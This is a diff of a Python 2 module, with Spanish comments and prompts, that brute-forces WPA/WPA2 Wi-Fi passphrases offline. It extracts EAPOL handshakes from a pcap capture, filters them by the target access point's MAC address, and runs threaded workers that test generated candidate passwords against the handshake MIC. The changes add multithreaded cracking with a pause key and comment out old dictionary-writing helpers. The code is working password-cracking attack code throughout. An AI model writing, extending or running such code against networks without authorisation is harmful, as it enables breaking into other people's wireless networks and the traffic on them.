@@ -1,10 +1,13 @@
 #-*-coding:utf8;-*-
-from cracker import hmac4times, crack
+from cracker import hmac4times, crack, numOfPs, crackProcess
 from pcapParser import load_savefile
 from halfHandshake import crackClients
 from Queue import Queue
 from sys import getsizeof
 from threading import Thread
+from time import sleep
+import termios, atexit, sys, os, time
+import shell
 
 def isWPAPass(passPhrase, ssid, clientMac, APMac, Anonce, Snonce, mic, data):
     pke = "Pairwise key expansion" + '\x00' + min(APMac,clientMac)+max(APMac,clientMac)+min(Anonce,Snonce)+max(Anonce,Snonce)
@@ -55,7 +58,7 @@ def perm(universo, longitud, inicio=False, fin=False):
         n -= 1
     contadores = (("c%d , " * n2) % tuple(range(n2)))[:-2]
     code += ('\t' * nt) + "comb = " + (("d%d + " * n2) % tuple(range(n2)))[:-2]  + "\n"
-    code += ('\t' * nt) + "print comb\n"
+    # code += ('\t' * nt) + "print comb\n"
     code += ('\t' * nt) + "yield comb\n"
     code += ('\t' * nt) + "if [" + contadores + "] == fin:\n"
     code += ('\t' * (nt + 1)) + "indexes = [" + (str(len(universo)) + ', ') * longitud  + "]\n"
@@ -66,45 +69,105 @@ def perm(universo, longitud, inicio=False, fin=False):
     return yield_perm()
 
 def peso(n,r):#usando permutacion con repeticion
-	"""
-	Muestra el peso en bit de un (diccionario) usando permutacion con repeticion n**r 
-	n=todos los elementos que hay ->una lista
-	r=tamaño de elementos a combinar->int
-	Tomando en cuenta los salto de lineas
-	"""
-	espacios=0;cont=0
-	for x in n:
-		cont=cont+1
-	cantidad=cont**r
-	bit=r*8
-	peso=cantidad*bit
-	for x in xrange(1,cantidad):#contando el ultimo salto
-		espacios=espacios+16
-	peso=peso+espacios
+    """
+    Muestra el peso en bit de un (diccionario) usando permutacion con repeticion n**r 
+    n=todos los elementos que hay ->una lista
+    r=tamaño de elementos a combinar->int
+    Tomando en cuenta los salto de lineas
+    """
+    espacios=0;cont=0
+    for x in n:
+        cont=cont+1
+    cantidad=cont**r
+    bit=r*8
+    peso=cantidad*bit
+    for x in xrange(1,cantidad):#contando el ultimo salto
+        espacios=espacios+16
+    peso=peso+espacios
 
-def crack_WPA_sin_dicc(capFilePath, mac, SSID, universo, longitud, inicio=False, fin=False, bufferSize=1231231):
-	passQueue = Queue()
-	thread = Thread(
-		target=insertar_combinaciones, 
-		args=(passQueue, universo, longitud),
-		kwargs=({"inicio": inicio, "fin" : fin, "bufferSize": bufferSize})
-	)
-	thread.start()
-	thread.join()
-	# insertar_combinaciones(passQueue, [0, 1, 2, 3, 4, 5, 6, 7, 8, 9], 8, fin=[0,0,0,0,0,0,1,0])
-	clients_data = extraer_cap_info(capFilePath)
-	passwd = crackClients(clients_data, mac, SSID, passQueue)
-	if passwd:
-		success(passwd)
-	else:
-		not_found()
+def crack_WPA_sin_dicc(capFilePath, usersMac, SSID, universo, longitud, inicio=False, fin=False, bufferSize=1231231):
+    global numOfPs
+    passQueue = Queue()
+    foundPassQ = Queue()
+    passQueue.status = "activo"
+    ingresar_comb_thread = Thread(
+        target=insertar_combinaciones, 
+        args=(passQueue, universo, longitud),
+        kwargs=({"inicio": inicio, "fin" : fin, "bufferSize": bufferSize})
+    )
+    ingresar_comb_thread.start()
+
+    clients = extraer_cap_info(capFilePath)
+    clientHandshakes = []
+    for client in clients:
+        handshake = []
+        for message in clients[client]:
+            if message['message'] == 1:
+                handshake = [message]
+            elif len(handshake) == 1:
+                handshake.append(message)
+                clientHandshakes.append(handshake)
+                break
+            else:
+                handshake = []
+    for clientHandshake in clientHandshakes:
+        if clientHandshake[0]['AP'] == usersMac:
+            threads = [
+                Thread(
+                    target=crackProcess, 
+                    args=(
+                        SSID, 
+                        clientHandshake[0]['client'], 
+                        clientHandshake[0]['AP'], 
+                        clientHandshake[0]['Anonce'], 
+                        clientHandshake[1]['Snonce'], 
+                        clientHandshake[1]['mic'], 
+                        clientHandshake[1]['data'], 
+                        passQueue, 
+                        foundPassQ
+                    )
+                ) 
+                for x in xrange(numOfPs)
+            ]
+            for th in threads:
+                th.start()
+            shell.init_anykey()
+            try:
+                while True:
+                    sleep(0.001)
+                    os.system("clear")
+                    print 'crackeando handshake...\npuedes detener el proceso presionando la letra "c" (despues podra ser reanudado)\n'
+                    #TODO: IMPRIMIR AQUI INFORMACION SOBRE EL PROCESO DE CRACKEO
+                    key = os.read(sys.stdin.fileno(), 1)
+                    if key == 'c':
+                        passQueue.status = "detener"
+                        break
+                    if foundPassQ.empty():
+                        if passQueue.status != "activo":
+                            returnVal = None
+                            print "fin de sesion."
+                            return
+                    else:
+                        passphrase = foundPassQ.get()
+                        passQueue.status = "finalizado"
+                        return passphrase
+
+                shell.term_anykey()
+            except Exception as e:
+                shell.term_anykey()
+                raise e
+
+
 
 def insertar_combinaciones(combQueue, universo, longitud, inicio=False, fin=False, bufferSize=1231231):
-	"""Inserta las combinaciones de un rango dado en una Queue."""
-	for comb in perm(universo, longitud, inicio=inicio, fin=fin):
-		while getsizeof(combQueue) >= bufferSize:
-			pass
-		combQueue.put(comb)
+    """Inserta las combinaciones de un rango dado en una Queue."""
+    for comb in perm(universo, longitud, inicio=inicio, fin=fin):
+        if combQueue.status != "activo":
+            return
+        while getsizeof(combQueue) >= bufferSize:
+            pass
+        combQueue.put(comb)
+    combQueue.status = "finalizado"
 
 def extraer_cap_info(readFile):
     try:
@@ -175,61 +238,61 @@ def extraer_cap_info(readFile):
     return clients
 
 def success(clave):
-	print "ENCONTRADA!:", clave
+    print "ENCONTRADA!:", clave
 
 def not_found():
-	print "La clave no ha sido encontrada."
+    print "La clave no ha sido encontrada."
 
 #ingresar Datos
-def ingresar():
-	"""
-	Pide al usuario todos los datos a utilizar 
-	saca en orden
-	(universo, longitud, inicio, fin, cola)
-	"""
-	cola=input("ingrese tamaño de buffer en bit->")
-	universo=[]
-	datos=raw_input("datos que quiere que compongan el dicionario->")
-	for x in datos:
-		universo.append(x)
-	longitud=input("longitud que tendra cada permutacion.->")
-	aux=True
-	while(len(inicio)!=longitud) or (aux==True):
-		aux=False
-		inicio=raw_input"ingrese la combinacion inicio->"
-	while (len(fin)!=longitud) or (aux==False):
-		aux=True
-		fin=raw_input"ingrese la combinacion final->"
-	return universo, longitud,inicio,fin,cola
-	#no le e echo salida de otro tipo por que no se que quieres
+# def ingresar():
+#     """
+#     Pide al usuario todos los datos a utilizar 
+#     saca en orden
+#     (universo, longitud, inicio, fin, cola)
+#     """
+#     cola=input("ingrese tamaño de buffer en bit->")
+#     universo=[]
+#     datos=raw_input("datos que quiere que compongan el dicionario->")
+#     for x in datos:
+#         universo.append(x)
+#     longitud=input("longitud que tendra cada permutacion.->")
+#     aux=True
+#     while(len(inicio)!=longitud) or (aux==True):
+#         aux=False
+#         inicio=raw_input"ingrese la combinacion inicio->"
+#     while (len(fin)!=longitud) or (aux==False):
+#         aux=True
+#         fin=raw_input"ingrese la combinacion final->"
+#     return universo, longitud,inicio,fin,cola
+#     #no le e echo salida de otro tipo por que no se que quieres
 
 #Esperar Tamaño Buffer
 
-def buffer(lista):#no es muy eficiente por que si se utiliza en un for por ejemplo entonces comparara una y otra vez para poder obtener lo que quiere
-	"""
-	Va sacando el peso de la lista
-	y comparandolo con el buffer deseado
-	la funcion pide lista a sacar peso para comparar
-	devuelve = valor booleano
-	"""
-	resp=False
-	peso=0
-	aux=ingresar()
-	cola=aux[4]
-	peso=len(lista)*8
-	for x in xrange(1,lista):#contando el ultimo salto
-		peso=peso+16
-	if(cola==peso):
-		resp=True
-	return resp
+# def buffer(lista):#no es muy eficiente por que si se utiliza en un for por ejemplo entonces comparara una y otra vez para poder obtener lo que quiere
+#     """
+#     Va sacando el peso de la lista
+#     y comparandolo con el buffer deseado
+#     la funcion pide lista a sacar peso para comparar
+#     devuelve = valor booleano
+#     """
+#     resp=False
+#     peso=0
+#     aux=ingresar()
+#     cola=aux[4]
+#     peso=len(lista)*8
+#     for x in xrange(1,lista):#contando el ultimo salto
+#         peso=peso+16
+#     if(cola==peso):
+#         resp=True
+#     return resp
 
-def escritura(dato):
-	"""
-	recibe un dato tipo = lista
-	lo escribe en C:/Users/Public/diccionario.txt
-	cada vez que ingrese otra lista salta de linea
-	"""
-	aux=open("C:/Users/Public/diccionario.txt","a")
-	#aux.write("\n" ) <--no se si ponerlo por que no se si interfiera con el proceso de utilizarlas posibles claves
-	aux.write(dato)
-	aux.close()
+# def escritura(dato):
+#     """
+#     recibe un dato tipo = lista
+#     lo escribe en C:/Users/Public/diccionario.txt
+#     cada vez que ingrese otra lista salta de linea
+#     """
+#     aux=open("C:/Users/Public/diccionario.txt","a")
+#     #aux.write("\n" ) <--no se si ponerlo por que no se si interfiera con el proceso de utilizarlas posibles claves
+#     aux.write(dato)
+#     aux.close()
